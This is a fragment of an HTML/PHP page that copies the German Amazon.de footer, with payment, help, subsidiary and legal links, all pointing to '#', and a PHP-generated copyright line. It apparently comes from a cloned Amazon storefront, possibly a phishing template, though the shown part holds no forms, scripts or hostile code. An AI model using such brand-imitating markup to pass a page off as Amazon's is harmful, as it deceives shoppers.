Zahlungsarten</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Amazon.de VISA Karte</a> </li> <li> <a href="#" class="nav_a">Kreditkarten</a> </li> <li> <a href="#" class="nav_a">Gutscheine</a> </li> <li> <a href="#" class="nav_a">Rechnung</a> </li> <li> <a href="#" class="nav_a">Bankeinzug</a> </li> <li> <a href="#" class="nav_a">Amazon Currency Converter</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Mein Amazon-Konto aufladen</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Wir helfen Ihnen</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Lieferung verfolgen oder Bestellung anzeigen</a> </li> <li> <a href="#" class="nav_a">Versand &amp; Verfügbarkeit</a> </li> <li> <a href="#" class="nav_a">Amazon Prime</a> </li> <li> <a href="#" class="nav_a">Rückgabe &amp; Ersatz</a> </li> <li> <a href="#" class="nav_a">Meine Inhalte und Geräte</a> </li> <li> <a href="#" class="nav_a">Amazon App</a> </li> <li> <a href="#" class="nav_a">Amazon Assistant</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Hilfe</a> </li> </ul> </td> </tr> </tbody></table> <div class="nav-footer-line"></div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterDescLine"> <table class="navFooterMoreOnAmazon" cellspacing="0"><tbody> <tr> <td class="navFooterDescItem"> <a href="#" class="nav_a"> AbeBooks<br><span class="navFooterDescText"> Bücher, Kunst<br>&amp; Sammelobjekte </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Amazon BuyVIP<br><span class="navFooterDescText"> Shopping Club<br>für Mode </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Amazon Web Services<br><span class="navFooterDescText"> Cloud Computing Dienste<br>von Amazon </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Audible<br><span class="navFooterDescText"> Hörbücher<br>herunterladen </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Book Depository<br><span class="navFooterDescText"> Bücher mit kostenfreier<br>Lieferung weltweit </span> </a> </td> </tr> <tr><td>&nbsp;</td></tr> <tr> <td class="navFooterDescItem"> <a href="#" class="nav_a"> IMDb<br><span class="navFooterDescText"> Filme, TV<br>&amp; Stars </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Kindle Direct Publishing<br><span class="navFooterDescText"> Ihr E-Book<br>veröffentlichen </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> MYHABIT<br><span class="navFooterDescText"> Private Modeschöpfer<br>Verkäufe </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Prime Now<br><span class="navFooterDescText"> 1-Stunden-Lieferung<br>Tausender Produkte </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Shopbop<br><span class="navFooterDescText"> Designer<br>Modemarken </span> </a> </td> </tr> <tr><td>&nbsp;</td></tr> <tr> <td class="navFooterDescItem"> &nbsp; </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Warehouse Deals<br><span class="navFooterDescText"> Reduzierte B-Ware<br></span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> ZVAB<br><span class="navFooterDescText"> Zentrales Verzeichnis<br>Antiquarischer Bücher und mehr </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> LOVEFiLM<br><span class="navFooterDescText"> DVD &amp; Blu-ray<br>Verleih per Post </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> &nbsp; </td> </tr> </tbody></table> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>